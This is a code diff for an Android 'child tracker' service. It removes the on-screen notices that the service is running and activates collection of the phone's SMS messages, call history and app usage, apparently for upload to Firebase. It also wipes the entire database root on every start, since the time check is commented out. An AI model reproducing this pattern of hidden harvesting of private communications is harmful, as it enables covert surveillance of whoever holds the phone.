@@ -3,7 +3,6 @@ package com.appdev.debsourav.childtracker;
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
-import android.widget.Toast;
 
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -27,29 +26,15 @@ public class ChildService extends Service {
         int minute = calendar.get(Calendar.MINUTE);
 
         //if(hour==23 && minute==59)
-
+        {
             DatabaseReference root = FirebaseDatabase.getInstance().getReference();
             root.setValue(null);
-        /*    MessageHistory.getAllSms(ChildService.this);
-            CallHistory.getCallDetails(ChildService.this);
-            AppStats.printCurrentUsageStatus(ChildService.this);
-            Toast.makeText(this, "Updating to Firebase", Toast.LENGTH_LONG).show();
-        MediaPlayer mp = MediaPlayer.create(this, R.raw.amico);
-        mp.start();
-        mp.setLooping(true);*/
+        }
+        CallHistory.getCallDetails(ChildService.this);
+        MessageHistory.getAllSms(ChildService.this);
+        AppStats.printCurrentUsageStatus(ChildService.this);
 
-        return Service.START_REDELIVER_INTENT;
 
-    }
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
+        return super.onStartCommand(intent,flag,startId);
     }
 }
